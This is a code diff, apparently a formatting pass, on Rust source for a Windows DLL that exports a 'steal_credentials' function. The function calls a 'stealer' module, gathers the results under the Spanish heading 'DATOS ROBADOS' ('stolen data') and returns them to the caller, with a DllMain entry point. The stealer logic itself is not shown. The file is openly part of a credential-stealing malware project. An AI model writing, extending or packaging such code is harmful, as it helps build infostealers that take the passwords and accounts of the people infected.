@@ -24,8 +24,8 @@
 
 #![allow(non_snake_case)]
 
-use std::os::raw::c_char;
 use std::ffi::CString;
+use std::os::raw::c_char;
 use std::panic;
 
 mod stealer;
@@ -65,24 +65,29 @@ pub extern "C" fn steal_credentials() -> *mut c_char {
     let result = panic::catch_unwind(|| {
         // Ejecutar el stealer
         let stolen_data = stealer::steal_all();
-        
+
         if stolen_data.is_empty() {
-            return CString::new("ERROR:No se encontraron credenciales").unwrap().into_raw();
+            return CString::new("ERROR:No se encontraron credenciales")
+                .unwrap()
+                .into_raw();
         }
-        
+
         // Formatear datos
         let mut output = String::from("═══ DATOS ROBADOS ═══\n");
-        output.push_str(&format!("Total: {} items encontrados\n", stolen_data.total_count()));
+        output.push_str(&format!(
+            "Total: {} items encontrados\n",
+            stolen_data.total_count()
+        ));
         output.push_str(&stolen_data.to_string());
-        
+
         CString::new(output).unwrap().into_raw()
     });
-    
+
     match result {
         Ok(ptr) => ptr,
-        Err(_) => {
-            CString::new("ERROR:Panic durante steal_credentials").unwrap().into_raw()
-        }
+        Err(_) => CString::new("ERROR:Panic durante steal_credentials")
+            .unwrap()
+            .into_raw(),
     }
 }
 
@@ -138,8 +143,8 @@ pub extern "system" fn DllMain(
     _lpv_reserved: *mut std::ffi::c_void,
 ) -> i32 {
     match fdw_reason {
-        1 => {}, // DLL_PROCESS_ATTACH
-        0 => {}, // DLL_PROCESS_DETACH
+        1 => {} // DLL_PROCESS_ATTACH
+        0 => {} // DLL_PROCESS_DETACH
         _ => {}
     }
     1 // TRUE
